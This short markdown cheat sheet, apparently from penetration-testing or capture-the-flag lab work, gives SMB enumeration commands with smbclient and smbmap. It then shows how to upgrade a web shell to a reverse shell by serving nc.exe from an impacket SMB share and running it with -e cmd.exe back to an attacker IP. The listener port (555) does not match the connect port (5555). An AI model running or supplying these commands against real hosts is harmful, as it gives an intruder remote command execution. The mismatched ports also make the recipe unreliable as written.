# SMB

test connection:

`smbclient -L \\\\192.168.56.108\\`

`smbmap -R -H 10.10.10.4`

## nc shell from web shell

```
~# smbserver.py share smb
#start nc on attacker's machine
~# nc -lvp 555
```
execute from the webshell:

`\\10.10.14.7\share\nc.exe -e cmd.exe 10.10.14.7 5555`